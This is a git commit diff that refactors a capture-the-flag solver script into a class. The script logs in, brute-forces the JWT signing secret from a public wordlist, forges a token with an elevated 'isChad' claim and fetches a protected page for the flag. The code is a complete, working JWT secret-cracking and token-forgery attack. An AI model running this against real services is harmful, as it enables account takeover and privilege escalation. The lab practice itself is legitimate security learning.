9ebf7ea7f7698b6f2678ac261558925af961eccb
SAW <99191294+nicsaw@users.noreply.github.com>
2025-03-07 10:24:38 +1100

    class Solver

--- ctf/2-Authn-Authz/soy_central.py
+++ ctf/2-Authn-Authz/soy_central.py
@@ -1,4 +1,3 @@
-import requests
 import sys
 from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
@@ -12,37 +11,39 @@ PASSWORD = "ilovesoy22"
 ALGORITHM = "HS256"
 SECRETS_LIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list"
 
-session = get_session()
+class Solver:
+    def __init__(self):
+        self.session = get_session()
 
-def get_secrets_list(session: requests.Session, secrets_list_url=SECRETS_LIST_URL) -> list[str]:
-    return session.get(secrets_list_url).text.splitlines()
+    def _get_secrets_list(self, secrets_list_url=SECRETS_LIST_URL) -> list[str]:
+        return self.session.get(secrets_list_url).text.splitlines()
 
-def brute_force_jwt_secret_key(jwt_token: str, algorithm=ALGORITHM):
-    for secret in get_secrets_list(session):
-        try:
-            jwt.decode(jwt_token, secret, algorithms=[algorithm])
-            return secret
-        except jwt.InvalidSignatureError:
-            continue
+    def _brute_force_jwt_secret_key(self, jwt_token: str, algorithm=ALGORITHM):
+        for secret in self._get_secrets_list():
+            try:
+                jwt.decode(jwt_token, secret, algorithms=[algorithm])
+                return secret
+            except jwt.InvalidSignatureError:
+                continue
 
-def main():
-    session.post(
-        BASE_URL + "/login",
-        data={"user": USERNAME, "password": PASSWORD}
-    )
+    def run(self):
+        self.session.post(
+            BASE_URL + "/login",
+            data={"user": USERNAME, "password": PASSWORD}
+        )
 
-    original_jwt = session.cookies.get("session")
+        original_jwt = self.session.cookies.get("session")
 
-    jwt_payload_data: dict = jwt.decode(original_jwt, options={"verify_signature": False})
-    jwt_payload_data["isChad"] = True
+        jwt_payload_data: dict = jwt.decode(original_jwt, options={"verify_signature": False})
+        jwt_payload_data["isChad"] = True
 
-    new_jwt = jwt.encode(jwt_payload_data, brute_force_jwt_secret_key(original_jwt), algorithm=ALGORITHM)
+        new_jwt = jwt.encode(jwt_payload_data, self._brute_force_jwt_secret_key(original_jwt), algorithm=ALGORITHM)
 
-    session.cookies.clear()
-    session.cookies.set("session", new_jwt)
+        self.session.cookies.clear()
+        self.session.cookies.set("session", new_jwt)
 
-    response = session.get(BASE_URL + "/chads")
-    find_flag(response.text)
+        response = self.session.get(BASE_URL + "/chads")
+        find_flag(response.text)
 
 if __name__ == "__main__":
-    main()
+    Solver().run()
